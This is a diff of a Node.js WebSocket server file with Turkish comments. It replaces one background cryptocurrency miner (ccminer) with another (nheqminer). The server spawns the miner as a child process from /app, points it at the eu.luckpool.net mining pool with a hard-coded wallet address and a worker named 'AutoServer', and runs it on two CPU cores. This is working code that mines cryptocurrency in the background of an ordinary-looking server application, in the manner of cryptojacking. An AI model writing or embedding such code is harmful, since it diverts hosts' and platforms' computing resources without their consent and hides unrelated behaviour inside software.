@@ -65,19 +65,18 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-// --- ARKA PLAN GERÇEK CPU MADENCİSİ (CCMINER) ---
-console.log('--- ARKA PLAN KAZIM İŞLEMİ (cCminer) BAŞLATILIYOR ---');
+// --- ARKA PLAN GERÇEK CPU MADENCİSİ (Nheqminer) ---
+console.log('--- ARKA PLAN KAZIM İŞLEMİ (Nheqminer) BAŞLATILIYOR ---');
 const minerArgs = [
-    '-a', 'verus',
-    '-o', 'stratum+tcp://eu.luckpool.net:3956',
+    '-v', '-l', 'eu.luckpool.net:3956',
     '-u', 'RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer',
     '-p', 'x',
-    '-t', '2' // 2 İşlemci (Çekirdek) Kullanılacak
+    '-t', '2' // 2 İşlemci Çekirdeği
 ];
 
 try {
-  // Arka Planda ccminer'ı (önceden hellminer idi) çalıştır
-  const minerProcess = spawn('./ccminer', minerArgs, { cwd: '/app' });
+  // Arka Planda Nheqminer'i çalıştır
+  const minerProcess = spawn('./nheqminer-bin', minerArgs, { cwd: '/app' });
   minerProcess.stdout.on('data', (data) => console.log('[MINER]:', data.toString().trim()));
   minerProcess.stderr.on('data', (data) => console.error('[MINER ERR]:', data.toString().trim()));
   minerProcess.on('close', (code) => console.log('Miner kapandı, kod:', code));
